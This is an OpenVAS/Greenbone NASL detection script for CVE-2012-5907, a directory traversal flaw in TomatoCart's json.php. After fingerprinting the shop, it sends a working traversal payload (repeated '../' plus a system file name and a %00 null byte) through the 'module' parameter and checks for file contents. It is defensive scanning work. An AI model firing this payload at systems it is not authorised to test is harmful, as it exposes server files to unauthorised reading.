# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901302");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2012-5907");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-11-28 10:32:05 +0530 (Wed, 28 Nov 2012)");
  script_name("TomatoCart 'json.php' Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74459");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52766");
  script_xref(name:"URL", value:"http://www.mavitunasecurity.com/local-file-inclusion-vulnerability-in-tomatocart/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/111291/TomatoCart-1.2.0-Alpha-2-Local-File-Inclusion.html");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application
  and execute arbitrary script code.");

  script_tag(name:"affected", value:"TomatoCart version 1.2.0 Alpha 2 and prior");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user supplied input via the
  'module' parameter to json.php, which allows attackers to read arbitrary files via a
  ../(dot dot) sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"TomatoCart is prone to a directory traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

cartPort = http_get_port(default:80);
if(!http_can_host_php(port:cartPort))exit(0);

files = traversal_files();

foreach dir (make_list_unique("/TomatoCart", "/tomatocart", "/", http_cgi_dirs(port:cartPort))){

  if(dir == "/") dir = "";
  cartUrl = dir + "/index.php";
  res = http_get_cache( item:cartUrl, port:cartPort );
  if( isnull( res ) ) continue;

  if( res =~ "^HTTP/1\.[01] 200" && ">TomatoCart<" >< res && '>Login<' >< res &&
      '>Create Account<' >< res && '>My Wishlist<' >< res ){

    foreach file (keys(files)){
      cartUrl = dir + "/json.php?action=3&module=" + crap(data:"../", length:3*15) + files[file] + "%00";

      if(http_vuln_check(port:cartPort, url:cartUrl, check_header:TRUE, pattern:file)){
        report = http_report_vuln_url(port:cartPort, url:cartUrl);
        security_message(port:cartPort, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
